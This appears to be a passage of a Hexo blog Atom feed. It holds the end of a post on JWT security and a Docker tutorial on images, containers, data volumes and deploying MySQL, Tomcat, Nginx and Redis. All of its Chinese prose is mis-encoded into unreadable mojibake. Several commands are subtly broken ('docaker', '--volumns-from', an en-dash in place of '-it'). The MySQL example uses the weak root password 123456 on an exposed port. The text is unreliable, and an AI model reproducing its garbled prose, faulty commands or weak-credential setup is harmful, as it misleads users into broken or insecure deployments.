å®ç°ï¼Œæ‰€ä»¥ç§»åŠ¨ç«¯å¸¸ç”¨çš„æ˜¯ token</strong></li></ul><p><strong>ä½¿ç”¨ JWT æ—¶éœ€è¦è€ƒè™‘çš„é—®é¢˜</strong></p><ul><li>å› ä¸º JWT å¹¶ä¸ä¾èµ– Cookie çš„ï¼Œæ‰€ä»¥ä½ å¯ä»¥ä½¿ç”¨ä»»ä½•åŸŸåæä¾›ä½ çš„ API æœåŠ¡è€Œä¸éœ€è¦æ‹…å¿ƒè·¨åŸŸèµ„æºå…±äº«é—®é¢˜ï¼ˆCORSï¼‰</li><li>JWT é»˜è®¤æ˜¯ä¸åŠ å¯†ï¼Œä½†ä¹Ÿæ˜¯å¯ä»¥åŠ å¯†çš„ã€‚ç”ŸæˆåŸå§‹ Token ä»¥åï¼Œå¯ä»¥ç”¨å¯†é’¥å†åŠ å¯†ä¸€æ¬¡ã€‚</li><li>JWT ä¸åŠ å¯†çš„æƒ…å†µä¸‹ï¼Œä¸èƒ½å°†ç§˜å¯†æ•°æ®å†™å…¥ JWTã€‚</li><li>JWT ä¸ä»…å¯ä»¥ç”¨äºè®¤è¯ï¼Œä¹Ÿå¯ä»¥ç”¨äºäº¤æ¢ä¿¡æ¯ã€‚æœ‰æ•ˆä½¿ç”¨ JWTï¼Œå¯ä»¥é™ä½æœåŠ¡å™¨æŸ¥è¯¢æ•°æ®åº“çš„æ¬¡æ•°ã€‚</li><li>JWT æœ€å¤§çš„ä¼˜åŠ¿æ˜¯æœåŠ¡å™¨ä¸å†éœ€è¦å­˜å‚¨ Sessionï¼Œä½¿å¾—æœåŠ¡å™¨è®¤è¯é‰´æƒä¸šåŠ¡å¯ä»¥æ–¹ä¾¿æ‰©å±•ã€‚ä½†è¿™ä¹Ÿæ˜¯ JWT æœ€å¤§çš„ç¼ºç‚¹ï¼šç”±äºæœåŠ¡å™¨ä¸éœ€è¦å­˜å‚¨ Session çŠ¶æ€ï¼Œå› æ­¤ä½¿ç”¨è¿‡ç¨‹ä¸­æ— æ³•åºŸå¼ƒæŸä¸ª Token æˆ–è€…æ›´æ”¹ Token çš„æƒé™ã€‚ä¹Ÿå°±æ˜¯è¯´ä¸€æ—¦ JWT ç­¾å‘äº†ï¼Œåˆ°æœŸä¹‹å‰å°±ä¼šå§‹ç»ˆæœ‰æ•ˆï¼Œé™¤éæœåŠ¡å™¨éƒ¨ç½²é¢å¤–çš„é€»è¾‘ã€‚</li><li>JWT æœ¬èº«åŒ…å«äº†è®¤è¯ä¿¡æ¯ï¼Œä¸€æ—¦æ³„éœ²ï¼Œä»»ä½•äººéƒ½å¯ä»¥è·å¾—è¯¥ä»¤ç‰Œçš„æ‰€æœ‰æƒé™ã€‚ä¸ºäº†å‡å°‘ç›—ç”¨ï¼ŒJWT çš„æœ‰æ•ˆæœŸåº”è¯¥è®¾ç½®å¾—æ¯”è¾ƒçŸ­ã€‚å¯¹äºä¸€äº›æ¯”è¾ƒé‡è¦çš„æƒé™ï¼Œä½¿ç”¨æ—¶åº”è¯¥å†æ¬¡å¯¹ç”¨æˆ·è¿›è¡Œè®¤è¯ã€‚</li><li>JWT é€‚åˆä¸€æ¬¡æ€§çš„å‘½ä»¤è®¤è¯ï¼Œé¢å‘ä¸€ä¸ªæœ‰æ•ˆæœŸæçŸ­çš„ JWTï¼Œå³ä½¿æš´éœ²äº†å±é™©ä¹Ÿå¾ˆå°ï¼Œç”±äºæ¯æ¬¡æ“ä½œéƒ½ä¼šç”Ÿæˆæ–°çš„ JWTï¼Œå› æ­¤ä¹Ÿæ²¡å¿…è¦ä¿å­˜ JWTï¼ŒçœŸæ­£å®ç°æ— çŠ¶æ€ã€‚</li><li>ä¸ºäº†å‡å°‘ç›—ç”¨ï¼ŒJWT ä¸åº”è¯¥ä½¿ç”¨ HTTP åè®®æ˜ç ä¼ è¾“ï¼Œè¦ä½¿ç”¨ HTTPS åè®®ä¼ è¾“ã€‚</li></ul>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker</title>
    <link href="/2021/05/27/Docker/"/>
    <url>/2021/05/27/Docker/</url>
    
    <content type="html"><![CDATA[<h1 id="DockerğŸ‹"><a href="#DockerğŸ‹" class="headerlink" title="DockerğŸ‹"></a>DockerğŸ‹</h1><h2 id="ä¸€ã€ç®€ä»‹"><a href="#ä¸€ã€ç®€ä»‹" class="headerlink" title="ä¸€ã€ç®€ä»‹"></a>ä¸€ã€ç®€ä»‹</h2><p>ä¼—æ‰€å‘¨çŸ¥ å¼€å‘ä¸€ä¸ªé¡¹ç›®æ—¶ æœ‰å‡ ä¸ªé˜¶æ®µï¼š å¼€å‘ã€æµ‹è¯•ã€ç”Ÿäº§ è€Œå¼€å‘æ—¶ä¼šé‡åˆ°å¼€å‘ç¯å¢ƒçš„å·®å¼‚ è€Œé€ æˆå¼€å‘çš„é¡¹ç›®å‡ºç°æ°´åœŸä¸æœ æ­¤æ—¶ä¸ºäº†é¿å…å‡ºç°è¿™ç§æƒ…å†µ å¯ä»¥æŠŠè½¯ä»¶ä»¥åŠç¯å¢ƒæ‰“åŒ… å³è§£å†³äº†è½¯ä»¶è·¨ç¯å¢ƒè¿ç§»çš„é—®é¢˜ Docker å°±æ˜¯è£…è¿™ä¸ªåŒ…çš„å®¹å™¨</p><ul><li><input checked="" disabled="" type="checkbox"> å¼€æº</li><li><input checked="" disabled="" type="checkbox"> Go è¯­è¨€</li><li><input checked="" disabled="" type="checkbox"> æ‰“åŒ…åå¯ä»¥è¿ç§»åˆ°ä»»ä½•çš„ linux çš„ä¸»æœºä¸Š</li><li><input checked="" disabled="" type="checkbox"> æ²™ç®±æœºåˆ¶ ç›¸äº’éš”ç¦» äº’ä¸å½±å“ <del>Docker é€ƒé€¸</del></li></ul><h2 id="äºŒã€æ¶æ„"><a href="#äºŒã€æ¶æ„" class="headerlink" title="äºŒã€æ¶æ„"></a>äºŒã€æ¶æ„</h2><p><strong>é•œåƒï¼š</strong>Docker é•œåƒå¯ä»¥ç±»æ¯”ä¸º ç±»<br><strong>å®¹å™¨ï¼š</strong>å¯ä»¥çœ‹ä½œæ˜¯é•œåƒçš„ å¯¹è±¡ å¯ï¼šåˆ›å»ºã€å¯åŠ¨ã€åœæ­¢ã€åˆ é™¤ã€æš‚åœ<br><strong>ä»“åº“ï¼š</strong>ç”¨æ¥ä¿å­˜é•œåƒ</p><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fhbimg.b0.upaiyun.com%2F3d7083fa7d291a90b05822583933224958a2af4d9067-6N1RKd_fw658&refer=http%3A%2F%2Fhbimg.b0.upaiyun.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1620113477&t=45b612ce6703b9aed09040223b8fee44"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fseo-1255598498.file.myqcloud.com%2Ffull%2F66ec0965a96e9a6d2d1c191ebcc8807ba71baa93.jpg&refer=http%3A%2F%2Fseo-1255598498.file.myqcloud.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1620113819&t=6abc442e6df87436f6b850b78b48ceda"></p><h2 id="ä¸‰ã€å‘½ä»¤"><a href="#ä¸‰ã€å‘½ä»¤" class="headerlink" title="ä¸‰ã€å‘½ä»¤"></a>ä¸‰ã€å‘½ä»¤</h2><p>é˜¿é‡Œäº‘å¼„ä¸€ä¸‹é•œåƒåŠ é€Ÿå™¨</p><p>docker</p><ul><li>æœåŠ¡ï¼š</li></ul><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">å¯åŠ¨<span class="hljs-keyword"> system</span>ctl start docaker<br>åœæ­¢<span class="hljs-keyword"> system</span>ctl stop docker<br>é‡å¯<span class="hljs-keyword"> system</span>ctl restart docker<br>å¼€æœºè‡ªå¯<span class="hljs-keyword"> system</span>ctl enable docker<br></code></pre></td></tr></table></figure><ul><li>é•œåƒï¼š</li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">local</span>ï¼š<br>æŸ¥çœ‹ <span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">images</span><br>åˆ é™¤(æ³¨æ„ä¸èƒ½åˆ é™¤æ­£åœ¨è¿è¡Œçš„å®¹å™¨) <span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">rmi</span> <span class="hljs-selector-tag">id</span>(image)/<span class="hljs-selector-tag">redis</span>:<span class="hljs-selector-tag">version</span><br><span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">rmi</span> `<span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">images</span> <span class="hljs-selector-tag">-q</span>`(å…¨åˆ  `ä¸ºescçš„é”®)<br><span class="hljs-selector-tag">remote</span>(åŠ é€Ÿå™¨)ï¼š<br>æœç´¢ <span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">search</span> <span class="hljs-selector-tag">redis</span><br>æ‹‰å– <span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">pull</span> <span class="hljs-selector-tag">redis</span> (:version)<br></code></pre></td></tr></table></figure><p>æœ‰æ—¶è¦åˆ°ä»–çš„å®˜æ–¹ä»“åº“æ‰¾é•œåƒ æœç´¢å‘½ä»¤ä¸ä¸€å®šèƒ½çœ‹åˆ°ä½ éœ€è¦çš„ç‰ˆæœ¬</p><ul><li>â­ å®¹å™¨ï¼š</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">åˆ›å»º docker run -i(ä¿æŒè¿è¡Œ) -t(åˆ†é…ç»ˆç«¯æ¥æ”¶å‘½ä»¤) --name=first é•œåƒå(:version(æœ‰å¤šä¸ªç‰ˆæœ¬æ—¶)) <span class="hljs-regexp">/bin/</span>bash(è¿›å…¥å®¹å™¨ æ‰“å¼€shell å¯çœç•¥) <span class="hljs-keyword">exit</span>é€€å‡º å®¹å™¨å…³é—­<br>     å‚æ•°ä¹Ÿèƒ½å†™ä½œ -it(ç§°ä½œäº¤äº’å¼å®¹å™¨) --name first<br>æŸ¥çœ‹æ‰€æœ‰å®¹å™¨ docker ps -a (upæ­£åœ¨è¿è¡Œ exitedé€€å‡º)<br>åå°åˆ›å»º docker run -id(å®ˆæŠ¤å¼å®¹å™¨) --name=first é•œåƒå <span class="hljs-regexp">/bin/</span>bash(ä¸è¿›å…¥å®¹å™¨) å®¹å™¨é€€å‡ºåä¸ä¼šå…³é—­<br>è¿›å…¥ docker exec -it first <span class="hljs-regexp">/bin/</span>bash(ä¸å¯çœç•¥)<br>å¯åŠ¨(å·²ç»åœæ­¢çš„å®¹å™¨) docker start é•œåƒid/é•œåƒå<br>åœæ­¢ docker stop é•œåƒå<br>æŸ¥çœ‹ docker inspect é•œåƒå<br>åˆ é™¤ docker rm å®¹å™¨id<br>docker rm `docker ps -a -q`(å…¨åˆ )<br></code></pre></td></tr></table></figure><h2 id="å››ã€æ•°æ®å·"><a href="#å››ã€æ•°æ®å·" class="headerlink" title="å››ã€æ•°æ®å·"></a>å››ã€æ•°æ®å·</h2><p>é—®é¢˜ï¼š<br>1ã€Docker å®¹å™¨åˆ é™¤å å®¹å™¨ä¸­äº§ç”Ÿçš„æ•°æ®è¿˜æœ‰å— æ²¡æœ‰</p><p>2ã€å®¹å™¨ä¹‹é—´æ€ä¹ˆæ•°æ®äº¤äº’</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210404155318730.png"></p><p><strong>ç‰©ç†æœº windows ä¸Š vm æ­å»º linux linux ä¸Šä½¿ç”¨ Docker</strong><br>3ã€Docker å®¹å™¨ä¸å¤–éƒ¨çš„ç‰©ç†æœº(æ³¨æ„ç‰©ç†æœºæŒ‡ windows)èƒ½ç›´æ¥äº¤äº’æ–‡ä»¶å— ä¸èƒ½<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210404155426461.png"></p><ul><li><p>æ•°æ®å·æ˜¯ linux çš„ä¸€ä¸ªç›®å½•æˆ–æ–‡ä»¶ æŠŠå®¹å™¨è£…è½½åˆ°æ•°æ®å·ä¸Š(å¯¹æ–¹çš„ä¿®æ”¹éƒ½ä¼šç«‹å³åŒæ­¥ï¼‰<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210404155501288.png"></p></li><li><p>ä¸€ä¸ªæ•°æ®å·å¯ä»¥è£…è½½å¤šä¸ªå®¹å™¨</p></li></ul><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210404155156627.png"></p><ul><li><p>ä¸€ä¸ªå®¹å™¨å¯ä»¥æŒ‚è½½å¤šä¸ªæ•°æ®å·<br><code>docker -it --name=first \</code><br><code>-v ../../...</code><br><code>-v ../../xxx</code></p></li><li><p><input checked="" disabled="" type="checkbox">  æ•°æ®å·å¯ä»¥å’Œç‰©ç†æœºäº¤æ¢æ–‡ä»¶</p></li><li><p><input checked="" disabled="" type="checkbox">  å®¹å™¨é—´é€šè¿‡æ•°æ®å·å®Œæˆæ•°æ®äº¤äº’</p></li></ul><p>é…ç½®æ•°æ®å·åœ¨åˆ›å»ºå®¹å™¨æ—¶ä½¿ç”¨<code>-v ../../../xxx(ç»å¯¹è·¯å¾„)</code></p><p>è·¯å¾„åœ¨ linux çš„è·¯å¾„ä¸‹è®¾ç½®</p><p>é—®é¢˜ 1ï¼šåˆ é™¤å®¹å™¨å Docker æ²¡æœ‰äº†äº§ç”Ÿçš„æ•°æ® ä½†æ•°æ®å·ä¼šä¿ç•™å®¹å™¨äº§ç”Ÿçš„æ•°æ® æ‰©å±•ï¼šæ¢å¤å®¹å™¨å†æ¬¡æŒ‚è½½æ•°æ®å· æ•°æ®ä»ç„¶å¯ä»¥ä½¿ç”¨</p><p>2ï¼šåŒä¸€ä¸ªæ•°æ®å·çš„å®¹å™¨ åœ¨æ•°æ®å·çš„å†…å®¹ç›¸åŒ å¯¹æ•°æ®å·çš„æ“ä½œåŒæ—¶ç”Ÿæ•ˆ</p><h2 id="äº”ã€æ•°æ®å·å®¹å™¨"><a href="#äº”ã€æ•°æ®å·å®¹å™¨" class="headerlink" title="äº”ã€æ•°æ®å·å®¹å™¨"></a>äº”ã€æ•°æ®å·å®¹å™¨</h2><p>å½“å¤šå®¹å™¨è¿›è¡Œæ•°æ®äº¤æ¢æ—¶ å†ä½¿ç”¨åŒä¸€ä¸ªæ•°æ®å·å°±ä¸æ–¹ä¾¿äº† æ­¤æ—¶éœ€è¦æ•°æ®å·å®¹å™¨</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210404155917095.png"></p><p>æ­¤æ—¶ç›¸å½“äºä¸¤ä¸ªå®¹å™¨ c1c2 ç›´æ¥æŒ‚è½½åˆ°æ•°æ®å·ä¸Š å‡å¦‚æ­¤æ—¶çš„ C3 åäº† c1c2 ä¸æ•°æ®å·çš„è”ç³»ä¹Ÿæ²¡æœ‰æ–­</p><p>æŒ‚è½½æ­¥éª¤</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">c3:<br>docker <span class="hljs-builtin-name">run</span> -it <span class="hljs-attribute">--name</span>=c3 -v **/volume(æ­¤ç›®å½•ä¸å¯æ”¹ ç”±Dockeråˆ†é…)** é•œåƒå<br><br>c1c2:<br>docker <span class="hljs-builtin-name">run</span> -it <span class="hljs-attribute">--name</span>=c1 --volumns-from c3 é•œåƒå<br><br>docker <span class="hljs-builtin-name">run</span> -it <span class="hljs-attribute">--name</span>=c2 --volumns-from c3 é•œåƒå<br></code></pre></td></tr></table></figure><h2 id="å…­ã€åº”ç”¨éƒ¨ç½²"><a href="#å…­ã€åº”ç”¨éƒ¨ç½²" class="headerlink" title="å…­ã€åº”ç”¨éƒ¨ç½²"></a>å…­ã€åº”ç”¨éƒ¨ç½²</h2><h3 id="â… ã€éƒ¨ç½²-MySQL"><a href="#â… ã€éƒ¨ç½²-MySQL" class="headerlink" title="â… ã€éƒ¨ç½² MySQL"></a>â… ã€éƒ¨ç½² MySQL</h3><ol><li>æœç´¢ mysql é•œåƒ</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search mysql<br></code></pre></td></tr></table></figure><ol start="2"><li>æ‹‰å– mysql é•œåƒ</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull mysql:5.6<br></code></pre></td></tr></table></figure><ol start="3"><li>åˆ›å»ºå®¹å™¨ï¼Œè®¾ç½®ç«¯å£æ˜ å°„ã€ç›®å½•æ˜ å°„</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> åœ¨/rootç›®å½•ä¸‹åˆ›å»ºmysqlç›®å½•ç”¨äºå­˜å‚¨mysqlæ•°æ®ä¿¡æ¯</span><br>mkdir ~/mysql<br>cd ~/mysql<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -id \<br>-p 3307:3306 \<br>--name=c_mysql \<br>-v $PWD/conf:/etc/mysql/conf.d \<br>-v $PWD/logs:/logs \<br>-v $PWD/data:/var/lib/mysql \<br>-e MYSQL_ROOT_PASSWORD=123456 \<br>mysql:5.6<br></code></pre></td></tr></table></figure><ul><li>å‚æ•°è¯´æ˜ï¼š<ul><li><strong>-p 3307:3306</strong>ï¼šå°†å®¹å™¨çš„ 3306 ç«¯å£æ˜ å°„åˆ°å®¿ä¸»æœºçš„ 3307 ç«¯å£ã€‚</li><li><strong>-v $PWD/conf:/etc/mysql/conf.d</strong>ï¼šå°†ä¸»æœºå½“å‰ç›®å½•ä¸‹çš„ conf/my.cnf æŒ‚è½½åˆ°å®¹å™¨çš„ /etc/mysql/my.cnfã€‚é…ç½®ç›®å½•</li><li><strong>-v $PWD/logs:/logs</strong>ï¼šå°†ä¸»æœºå½“å‰ç›®å½•ä¸‹çš„ logs ç›®å½•æŒ‚è½½åˆ°å®¹å™¨çš„ /logsã€‚æ—¥å¿—ç›®å½•</li><li><strong>-v $PWD/data:/var/lib/mysql</strong> ï¼šå°†ä¸»æœºå½“å‰ç›®å½•ä¸‹çš„ data ç›®å½•æŒ‚è½½åˆ°å®¹å™¨çš„ /var/lib/mysql ã€‚æ•°æ®ç›®å½•</li><li><strong>-e MYSQL_ROOT_PASSWORD=123456ï¼š</strong>åˆå§‹åŒ– root ç”¨æˆ·çš„å¯†ç ã€‚</li></ul></li></ul><ol start="4"><li>è¿›å…¥å®¹å™¨ï¼Œæ“ä½œ mysql</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker exec â€“it c_mysql /bin/bash<br></code></pre></td></tr></table></figure><ol start="5"><li>ä½¿ç”¨å¤–éƒ¨æœºå™¨è¿æ¥å®¹å™¨ä¸­çš„ mysql</li></ol><h3 id="â…¡ã€éƒ¨ç½²-Tomcat"><a href="#â…¡ã€éƒ¨ç½²-Tomcat" class="headerlink" title="â…¡ã€éƒ¨ç½² Tomcat"></a>â…¡ã€éƒ¨ç½² Tomcat</h3><ol><li>æœç´¢ tomcat é•œåƒ</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search tomcat<br></code></pre></td></tr></table></figure><ol start="2"><li>æ‹‰å– tomcat é•œåƒ</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull tomcat<br></code></pre></td></tr></table></figure><ol start="3"><li>åˆ›å»ºå®¹å™¨ï¼Œè®¾ç½®ç«¯å£æ˜ å°„ã€ç›®å½•æ˜ å°„</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> åœ¨/rootç›®å½•ä¸‹åˆ›å»ºtomcatç›®å½•ç”¨äºå­˜å‚¨tomcatæ•°æ®ä¿¡æ¯</span><br>mkdir ~/tomcat<br>cd ~/tomcat<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -id --name=c_tomcat \<br>-p 8080:8080 \<br>-v $PWD:/usr/local/tomcat/webapps \<br>tomcat<br></code></pre></td></tr></table></figure><ul><li><p>å‚æ•°è¯´æ˜ï¼š</p><ul><li><p><strong>-p 8080:8080ï¼š</strong>å°†å®¹å™¨çš„ 8080 ç«¯å£æ˜ å°„åˆ°ä¸»æœºçš„ 8080 ç«¯å£</p><p><strong>-v $PWD:/usr/local/tomcat/webappsï¼š</strong>å°†ä¸»æœºä¸­å½“å‰ç›®å½•æŒ‚è½½åˆ°å®¹å™¨çš„ webapps</p></li></ul></li></ul><ol start="4"><li>ä½¿ç”¨å¤–éƒ¨æœºå™¨è®¿é—® tomcat</li></ol><h3 id="â…¢ã€éƒ¨ç½²-Nginx"><a href="#â…¢ã€éƒ¨ç½²-Nginx" class="headerlink" title="â…¢ã€éƒ¨ç½² Nginx"></a>â…¢ã€éƒ¨ç½² Nginx</h3><ol><li>æœç´¢ nginx é•œåƒ</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search nginx<br></code></pre></td></tr></table></figure><ol start="2"><li>æ‹‰å– nginx é•œåƒ</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull nginx<br></code></pre></td></tr></table></figure><ol start="3"><li>åˆ›å»ºå®¹å™¨ï¼Œè®¾ç½®ç«¯å£æ˜ å°„ã€ç›®å½•æ˜ å°„</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> åœ¨/rootç›®å½•ä¸‹åˆ›å»ºnginxç›®å½•ç”¨äºå­˜å‚¨nginxæ•°æ®ä¿¡æ¯</span><br>mkdir ~/nginx<br>cd ~/nginx<br>mkdir conf<br>cd conf<br><span class="hljs-meta">#</span><span class="bash"> åœ¨~/nginx/conf/ä¸‹åˆ›å»ºnginx.confæ–‡ä»¶,ç²˜è´´ä¸‹é¢å†…å®¹</span><br>vim nginx.conf<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs shell">user  nginx;<br>worker_processes  1;<br><br>error_log  /var/log/nginx/error.log warn;<br>pid        /var/run/nginx.pid;<br><br><br>events &#123;<br>    worker_connections  1024;<br>&#125;<br><br><br>http &#123;<br>    include       /etc/nginx/mime.types;<br>    default_type  application/octet-stream;<br><br>    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;<br>                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;<br>                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;<br><br>    access_log  /var/log/nginx/access.log  main;<br><br>    sendfile        on;<br>    #tcp_nopush     on;<br><br>    keepalive_timeout  65;<br><br>    #gzip  on;<br><br>    include /etc/nginx/conf.d/*.conf;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -id --name=c_nginx \<br>-p 80:80 \<br>-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf \<br>-v $PWD/logs:/var/log/nginx \<br>-v $PWD/html:/usr/share/nginx/html \<br>nginx<br></code></pre></td></tr></table></figure><ul><li>å‚æ•°è¯´æ˜ï¼š<ul><li><strong>-p 80:80</strong>ï¼šå°†å®¹å™¨çš„ 80 ç«¯å£æ˜ å°„åˆ°å®¿ä¸»æœºçš„ 80 ç«¯å£ã€‚</li><li><strong>-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf</strong>ï¼šå°†ä¸»æœºå½“å‰ç›®å½•ä¸‹çš„ /conf/nginx.conf æŒ‚è½½åˆ°å®¹å™¨çš„ :/etc/nginx/nginx.confã€‚é…ç½®ç›®å½•</li><li><strong>-v $PWD/logs:/var/log/nginx</strong>ï¼šå°†ä¸»æœºå½“å‰ç›®å½•ä¸‹çš„ logs ç›®å½•æŒ‚è½½åˆ°å®¹å™¨çš„/var/log/nginxã€‚æ—¥å¿—ç›®å½•</li></ul></li></ul><ol start="4"><li>ä½¿ç”¨å¤–éƒ¨æœºå™¨è®¿é—® nginx</li></ol><h3 id="â…£ã€éƒ¨ç½²-Redis"><a href="#â…£ã€éƒ¨ç½²-Redis" class="headerlink" title="â…£ã€éƒ¨ç½² Redis"></a>â…£ã€éƒ¨ç½² Redis</h3><ol><li>æœç´¢ redis é•œåƒ</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search redis<br></code></pre></td></tr></table></figure><ol start="2"><li>æ‹‰å– redis é•œåƒ</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull redis:5.0<br></code></pre></td></tr></table></figure><ol start="3"><li>åˆ›å»ºå®¹å™¨ï¼Œè®¾ç½®ç«¯å£æ˜ å°„</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -id --name=c_redis -p 6379:6379 redis:5.0<br></code></pre></td></tr></table></figure><ol start="4"><li>ä½¿ç”¨å¤–éƒ¨æœºå™¨è¿æ¥ redis</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./redis-cli.exe -h 192.168.149.135 -p 6379<br></code></pre></td></tr></table></figure><h2 id="ä¸ƒã€é•œåƒ"><a href="#ä¸ƒã€é•œåƒ" class="headerlink" title="ä¸ƒã€é•œåƒ"></a>ä¸ƒã€é•œåƒ</h2><p>ä¸ºä»€ä¹ˆä¸€ä¸ªæ“ä½œç³»ç»Ÿçš„é•œåƒåœ¨ Docker é‡Œä¼šå¾ˆå° å› ä¸ºä½¿ç”¨äº†å½“å‰æ“ä½œç³»ç»Ÿçš„ bootfs æ‹‰å–ä¸‹æ¥çš„åªæ˜¯ rootfs å’Œå¾€ä¸Šçš„é•œåƒå±‚<br>åˆæ¯”å¦‚ tomcat çš„å®‰è£…åŒ…æ¯”é•œåƒå°</p><p>linux(bootfs-&gt;rootfs)<br>æœ¬è´¨ï¼šDocker çš„åº•ç«¯æ˜¯ bootfs è€Œä¸”æ˜¯ä½¿ç”¨çš„æ˜¯å®¿ä¸»æœºçš„å†…æ ¸ ç¬¬äºŒå±‚æ˜¯å½“å‰ç³»ç»Ÿçš„ rootfs çš„åŸºç¡€é•œåƒ base image ç„¶åå°±æœ‰è½¯ä»¶çš„ç¼–è¯‘ç¯å¢ƒå¦‚ jdk æœ€åæš´éœ²åœ¨å¤–é¢çš„å°±æ˜¯è½¯ä»¶çš„é•œåƒ <strong>å³åˆ†å±‚æ–‡ä»¶ç³»ç»Ÿ</strong></p><p><img 